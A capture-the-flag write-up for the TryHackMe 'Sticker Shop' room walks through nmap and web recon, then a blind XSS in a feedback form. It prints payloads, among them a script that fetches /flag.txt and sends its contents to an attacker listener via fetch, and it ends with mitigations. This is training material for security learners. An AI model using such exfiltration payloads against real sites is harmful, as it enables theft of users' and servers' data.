---
description: https://tryhackme.com/room/thestickershop
---

# The Sticker Shop

<div align="left"><figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F8yq56OPjKxPHxwu5IH5N%2Fuploads%2FNT8XDqUyM0a5T5nh4iYA%2Fimage.png?alt=media&#x26;token=96d70c70-d8b3-4b85-bc29-116f6b0eae2d" alt="" width="188"><figcaption><p><a href="https://tryhackme.com/room/thestickershop">https://tryhackme.com/room/thestickershop</a></p></figcaption></figure></div>

🔗 [The Sticker Shop](https://tryhackme.com/room/thestickershop)​

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.73.89`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.73.89 tss.thm" >> /etc/hosts

mkdir thm/tss.thm
cd thm/tss.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 tss.thm
PING tss.thm (10.10.73.89) 56(84) bytes of data.
64 bytes from tss.thm (10.10.73.89): icmp_seq=1 ttl=63 time=65.0 ms
64 bytes from tss.thm (10.10.73.89): icmp_seq=2 ttl=63 time=61.9 ms
64 bytes from tss.thm (10.10.73.89): icmp_seq=3 ttl=63 time=62.3 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

This guide does not provide a path and intermediate answers, but asks us directly for the flag.

Let's capture her right away with a curl `curl -i http://tss.thm:8080/flag.txt`&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure></div>

2 of spades! :D

<figure><img src="../.gitbook/assets/image (428).png" alt=""><figcaption></figcaption></figure>

Not worry, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 tss.thm -oG nmap/port_scan
```

```bash
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 22 and 8080.

Now, we need to search which services are running on open ports:

```bash
nmap -p22,8080 -n -Pn -vvv -sCV --min-rate 5000 tss.thm -oN nmap/open_port
```

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZ5yrbM4EUF9kvSfSmVTdRWGVeqTTpQpwFopgW7iFN3f/I3mBWiJpAGL8Q8rEs7n8ESeN0yRcr1lGSuUtRqk5Mwei9edFIAGFC0uEJMnO7EQl/3O8PAlTGeuIaEg+YItzpmXOIWfslh0oftoQNN0iWouJFj7DU5QtoiuwK9GIDwD54aaJ6QQHu16nYYk0fTmA2szzSy0nL0fG1I+ILOnVf1SEyDu5a+uHSKA4lERXWsJ6KDhEtxAuf1+uk8x33I4ERJQsGEZ/GbFJsPxbWhFgyvRE9cScm+YpeppPBMwbvicnEg+MZLuDfXAzYCsDvXPem8io/8QlqHXAyTb/hfw8twUiLuWRHPuHH6E4tq+cztlD/BsfydBn+72TEB7dZnRnWP4tAnI5au2KiPA1RA3ud3JNn7Ha7iU0AA5MK9gKhSv/S5tDyLhFbAcLm8ByWzdJ1R5F8NIlWG8C9VDgDuixmIQwsV4D7FthMTsDaM5PuJHr5GDOfT56Mn3fGxQT2W4k=
|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKVWb4NfXmP4f5RQIvXlrggi/9cDARgYazfJpJFlRhH/Ypg/QO6JQ0cj+BInTq4qjv9q5f1ksX0KLJxT2sc95WI=
|   256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQ5WIN3vZO9KIDXb+PpV5yqA3SVieIqn8jSOGdjDHm1
8080/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.1 (Python 3.8.10)
|_http-title: Cat Sticker Shop
|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The  web server is configured on port 8080 and not on 80, let's go there!

### Task 3 - Find the flag.txt

Proceeding to enumerate our website using a cmd tool: `whatweb "http://tss.thm:8080"`

<figure><img src="../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

We just know this info through nmap scan results, we'll investigate very well about "werkzeug 3.0 1 python 3.8 10", we will eventually check if it is vulnerable later.

TNow let's open the browser to view the web page (port 8080):

here, there're two products/sticker images that we can only see.

<figure><img src="../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

and see page source for checking information disclosure.

<figure><img src="../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

but we don't find precious info.

In the meantime I ran a 'directory enumeration' scan with gobuster, which unfortunately returned no results.

```bash
gobuster dir -u http://tss.thm:8080 -w /usr/share/wordlists/dirb/common.txt
```

Let's move to the second page: "Feedback":

<figure><img src="../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

Very good, a textarea where we can write and submit a feedback, it can be an injection point.

Testing the standard XSS payload: `<script>alert("XSS")</script>` we have no errors, but at the same time nothing is reflected:

<figure><img src="../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

let's analyze the thing better by capturing the http request with our dear Burp Suite proxy.&#x20;

<figure><img src="../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

We can see that's a POST request and the following file formats are accepted in the form

`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng`

Since the possible XSS seems hidden, let's try to see if it allows us to connect to our attacker machine using the javascript method: fetch

Retrieve our attacker machine IP (`10.21.31.235`)

<figure><img src="../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

Go in listening mode with netcat on port 1339: `nc -lvnp 1339`

and execute into BurpSuite Repeater or directly into textarea this command:&#x20;

```java
<img src=x onerror="fetch('http://10.21.31.235:1339')"/>
```

and we receive the request, fantastic!

<figure><img src="../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

Based on this and remembering that the flag is in the path /flag.txt,  we prepare a payload that allows us to extract the flag in the response:

```javascript
<script>
fetch('http://tss.thm:8080/flag.txt') // Requests the flag file from the target server
  .then(response => response.text()) // Reads the response as text
  .then(data => {
    fetch('http://10.21.31.235:1339/?data=' + encodeURIComponent(data)) // Sends stolen data to attacker's machine
  })
</script>
```

<figure><img src="../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

Flag found!

<details>

<summary>Possible Mitigations</summary>

* **Content Security Policy (CSP)**: Block inline scripts and limit allowed domains for `fetch` requests.

- **Proper XSS filtering**: Sanitize user inputs to prevent script injection.

* **Same-Origin Policy enforcement**: Ensure sensitive files like `flag.txt` are not accessible from untrusted origins.

- **HttpOnly & Secure cookies**: Prevent session hijacking through XSS attacks

</details>

<details>

<summary>🚩 Flag (flag.txt)</summary>



</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F8yq56OPjKxPHxwu5IH5N%2Fuploads%2FU0GAkeVtisswlyxGZXqL%2Fimage.png?alt=media&#x26;token=d3e8efe5-389b-4ff0-82b7-4fcb275f1fbf" alt=""><figcaption></figcaption></figure>
